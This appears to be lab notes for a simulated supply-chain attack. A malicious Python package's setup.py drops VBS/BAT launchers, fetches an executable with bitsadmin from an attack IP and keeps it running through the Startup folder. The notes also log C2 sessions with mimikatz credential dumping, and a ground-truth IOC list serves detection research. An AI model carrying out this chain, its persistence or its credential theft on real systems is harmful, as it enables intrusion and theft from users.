## Starter (SC2)

- Prepare：

    - Download [pyenv-win](https://pyenv-win.github.io/pyenv-win/docs/installation.html#pyenv-win-zip)
    
    - Configure python version with 3.10:
        ```
            pyenv install 3.10
            pyenv global 3.10
        ```
    
    - Simulated normal behaviour for daily operation (increase noise) 

        - Windows Dev Host (download python package):
            
            - Pre-installed Software
                - vs code, filezilla, pip, python, git, MobaXterm, discord, 1password
            
            - Simulated Behaviours
                - 2, 3, 4, 5, 6, 7, 8, 9


    - Configure discord Webhook
        
        - create a server managed by yourself (have permission to manage this channel)

        - Right-click a channel (text channel).

        - Select Integrations.

        - Click Webhooks.

        - Click New Webhook and copy the created link
    
    - Web Service to host exectuable file
        ```
        python3 app.py
        
        ```

        the following script will access http://20.93.23.234:8081/dl/runtime to download the executable file


    - Create RunTime.exe

        create runtime.exe with apollo, follow the instructions under apt readme.md

    - Create Payload 

        ```
        # under sc2/payload
        python3 xor_encode.py # encode plain_setup.py into setup.txt

        # copy the value inside setup.txt and replace the encoded variable (wopvEaTEcopFEavc) value inside setup.py

        # create information gathering payload 
        pip3 install pyinstaller
        pyinstaller --onefile SenScanner.py
        pyinstaller --onefile SysScanner.py

        # executable files will be saved to current dist folder
        ``` 
        
- Exploitation

    - payload execution

        ```
            python3 setup.py install # under pystallerer-1.0.0

        ```

        The involving actions:

        - 1. Identify the current Windows user

            The malware retrieves the username to construct paths inside the user’s roaming profile and to embed it into the exfiltration data.

        - 2. Prepare a hidden "System64" directory

            A fake system folder is created.

        - 3. Drop VBS launcher files (silent execution + persistence)

            Two VBS files are created:

                WIN32.vbs — used to silently launch the BAT downloader

                WIN64.vbs — placed in the Windows Startup folder for persistence
        
        - 4. Drop BAT launcher file

            The malicious BAT file:

                Downloads remote payloads (e.g., runtime.exe) via bitsadmin

                Stores them inside the hidden System64 folder

                Executes the Startup VBS to trigger persistence behavior

        - 5. Trigger the execution chain

            ```
            subprocess.run(
                f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\WIN32.vbs",
                shell=True,
                check=True
            )
            ```
            Which kicks off the VBS → BAT → EXE execution chain.


- Trigger

    under executing setup.py --- automatically trigger the download and execution of payload

- Evasion Method

    - sophisticated encryption method
    - file replacement
    - earse trace

- Attack Timeline
    （Win: host1, Attack: host2）

    - host1 (2025.12.10):

        - start normal behaviour simulation (9:47): under git console

        ```
        # need to export OPENAI_API_KEY first
        python3 state.py
        ```

        wait for reasonable time to trigger similar normal package download behaviour

        - start to build malicious package (pystallerer-1.0.0) (10:13)

        ```
        python3 setup.py install
        ```


    - host2 (2025.12.10):

        - start serving web server (9:50): for executable file access

        - received callback on Mythic (10:14)

        - start to explore process and folders 

            - download a file (10:15)

            - use simple commands to check basic information (10:16-25)
                ```
                whoami # got basic system information
                pwd

                ifconfig # got basic network information

                netstat # check open ports and service

                ```
        - start to open server to receive compressed collected information
            ```
            # terminate pervious runtime.exe server (sharing the same port)
            python3 server.py
            ```

        - upload script for system information gathering 

            try to upload assembly file (SysScanner.exe) and load it with execute_assembly (10:36) -- failed

            ```
            # register SysScanner.exe first
            register_assembly
            # choose SysScanner file
            # try to run it (10:42) (directly inside command interface)
            execute_assembly SysScanner.exe --full
            # try to run it (10:43)
            execute_assembly SysScanner --full # failed
            
            # ------ run with mimikatz (11:04) -------
            privilege::debug # successful
            lsadump::sam # failed
            sekurlsa::logonpasswords  # successful

            # register file SysScanner.exe (11:11)
            register_file # need to wait until it is successfully registered (successfully att 11:15)
            # using run command to run
            run # add name with SysScanner - failed (11:14)
            # run again --- failed

            # ------ Use upload and run as a pair ------
            # upload file
            upload # upload SysScanner.exe to C:\Users\test.exe (11:22)
            # run this file
            run # provide Executable C:\Users\test.exe (11:30)

            ```

            - received compressed file by SysScanner --- failed due to win32 compatibility problem

            - use shell script to collect information

            ```
            # upload shell (13:42)
            upload # uplaoad sysshell.sh to C:\Users\test.sh
            # run this file
            run # provide Executable C:\Users\test.sh (13:42) --- failed with compatiable problem

            ```

            - user powershell to collect information

            ```
            # upload powershell (15:07)
            upload # uplaoad sysshell.ps1 to C:\Users\test.ps1
            # run the powershell
            run # fail

            # register powershell (15:17)
            register_file # upload sysshell.ps1
            # run it in memory
            powershell -script sysshell.ps1 # post successful

            ```


- Ground Truth:

    - core IOCs with locaitons and numbers:

        - package name:
            - pystallerer-1.0.0 (with setup.py)

                - locations: azure_events (19784-19796, 19839-19845, 25359-25378, 25383-25386, 25391- 25395, 25402-25403)

                - numbers: 51

        - attack ip: 20.93.23.234
            - locations: azure_events (558, 25386, 25408)
            - numbers: 3 (2 after filtering repeated records)
            - detail:
                - 558: Runtime.exe → 20.93.23.234 (C2 callback, 15:20:07)
                - 25386: bitsadmin download (http://20.93.23.234:8081/dl/runtime (10:13:56))
                - 25408: Runtime.exe → 20.93.23.234 (first callback, 10:14:02)

        - suspicious port: 8081
            - locations: (558, 25386)
            - numbers: 2 (0 after filtering repeated records)
        
        - data exfiltration:
            - locations: azure_events (558, 10946, ...)
            - numbers: 10
            - breakdown:
                - C2 callback: runtime.exe -> 20.93.23.234
                - CreateRemoteThreat inject: 656 records
                - File upload (test.exe): 10946, 28695

        - Auxiliary IOCs:
            - win32.vbs: 25380, 25383, 25384, 25385 (4)
            - win64.vbs (persistent): 8145, 25381, 25402, 25403 (4)
            - bitsadmin.exe: 25386 (1)
            - System64: 31 records
            - Runtime.exe: 20 records
            - setup.py: 18 records
    
    - total iocs: 139

    - total unique records: 78 

    

